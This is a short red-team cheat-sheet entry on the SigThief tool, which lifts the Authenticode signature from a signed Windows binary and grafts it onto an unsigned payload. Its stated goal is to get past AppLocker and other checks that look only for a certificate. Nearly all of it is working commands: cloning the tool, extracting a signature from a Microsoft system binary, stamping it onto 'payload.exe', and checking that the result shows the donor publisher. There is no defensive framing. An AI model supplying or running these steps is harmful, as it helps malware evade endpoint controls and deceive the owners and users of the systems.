# 06.03 sigthief

> Strip Authenticode signature from a legitimate signed binary and graft onto an unsigned payload.

## Overview

sigthief copies the WIN_CERTIFICATE blob from a signed PE (Microsoft signed binaries work well) onto an unsigned target binary. The grafted signature does NOT validate — but many tooling checks and AppLocker policies look only at the presence of a cert table and the publisher CN, not at full verification. Useful for bypassing weak heuristics.

## Steps

- **Step 1** - Clone from GitHub.
- **Step 2** - Extract signature from a donor PE.
- **Step 3** - Graft onto your payload.

## Commands

### Install

```bash
git clone https://github.com/secretsquirrel/SigThief
cd SigThief
```

### Extract sig from donor

```bash
python3 sigthief.py -i C:\\Windows\\System32\\WindowsUpdateBox.exe -r -o sig.bin
```

### Graft onto unsigned PE

```bash
python3 sigthief.py -i WindowsUpdateBox.exe -t payload.exe -o payload-signed.exe
# One-shot rip-and-graft
python3 sigthief.py -i donor.exe -t target.exe -o output.exe
```

### Verify visually

```powershell
Get-AuthenticodeSignature .\payload-signed.exe | fl *
# Status: HashMismatch, but SignerCertificate.Subject reads as donor publisher
```
